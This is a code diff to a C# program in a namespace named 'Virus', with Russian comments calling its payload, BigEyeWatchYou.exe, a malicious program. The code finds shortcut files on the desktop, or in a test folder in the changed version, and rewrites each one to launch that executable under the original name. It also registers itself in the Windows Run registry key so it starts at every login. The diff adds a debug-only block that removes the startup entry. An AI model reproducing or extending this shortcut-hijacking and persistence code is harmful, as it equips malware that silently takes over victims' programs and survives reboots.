@@ -5,7 +5,7 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using Microsoft.Win32;
-using LnkChanger;
+using ShellLinkChanger;
 
 using System.Runtime.InteropServices;
 
@@ -22,21 +22,20 @@ namespace Virus
             // Получение пути к рабочему столу
             var desktopFolder = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
 
+            var testFolder = @"C:\Users\New\Desktop\Test";
+
             // Получение файлов ярлыков
-            var files = LnkHelper.GetAllShortcutsFiles(desktopFolder);
+            var files = ShellLinkHelper.GetAllShellLinkFiles(testFolder);
 
             // Получение абсолютного пути к вредоносной программе
             var targetPath = Path.GetFullPath("BigEyeWatchYou.exe");
 
             foreach (var file in files)
             {
-
-                // Получем путь, который щас указан в ярлык
-                // Если он не содержит путь к нашей вредоносной программе, то меняем
-                var path = LnkHelper.GetShellLinkPath(file.FullName);
-                if (!path.Contains("BigEyeWatchYou.exe"))
+                var link = ShellLinkHelper.GetShellLinkPath(file.FullName);
+                if (!link.Path.Contains("BigEyeWatchYou.exe"))
                 {
-                    LnkHelper.ChangeShortcut(file.FullName, targetPath,
+                    ShellLinkHelper.ChangeShellLink(file.FullName, targetPath,
                         QuotedMarked(Path.GetFileNameWithoutExtension(file.Name)));
                 }
             }
@@ -57,11 +56,19 @@ namespace Virus
         /// </summary>
         private static void SetStartup()
         {
+
             RegistryKey rk = Registry.CurrentUser.OpenSubKey
                 ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
 
             string appFullPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
             string appName = Path.GetFileNameWithoutExtension(appFullPath);
+
+#if DEBUG
+            if (rk.GetValue(appName) != null)
+            {
+                rk.DeleteValue(appName);
+            }
+#endif
 
             if (rk.GetValue(appName) == null)
             {
